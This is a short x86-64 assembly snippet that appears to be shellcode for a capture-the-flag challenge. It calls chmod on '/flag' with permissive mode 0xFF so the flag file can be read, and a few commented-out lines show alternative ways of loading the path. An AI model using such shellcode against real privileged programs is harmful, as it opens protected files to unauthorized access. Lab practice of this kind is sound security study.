.global _start
_start:
.intel_syntax noprefix

#mov rdi, [rip + flagText]
#push rdi

mov rax, 90
#lea rdi, [rip + flagText]
mov edi, 0x22dbd015
mov rsi, 0xFF
syscall

flagText:
    .string "/flag"
